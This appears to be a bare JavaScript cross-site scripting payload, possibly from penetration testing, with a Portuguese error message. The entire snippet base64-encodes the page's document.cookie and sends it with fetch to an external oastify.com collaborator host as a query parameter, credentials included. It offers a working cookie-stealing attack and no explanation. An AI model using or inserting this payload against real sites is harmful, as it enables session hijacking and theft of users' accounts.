let b = btoa(document.cookie)

fetch('https://wrroiawxelhsf1k9xbehgkmg379yxple.oastify.com/aa?cookies='.concat(b), {
    method: 'GET', 
    credentials: 'include', 
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Erro:', error));
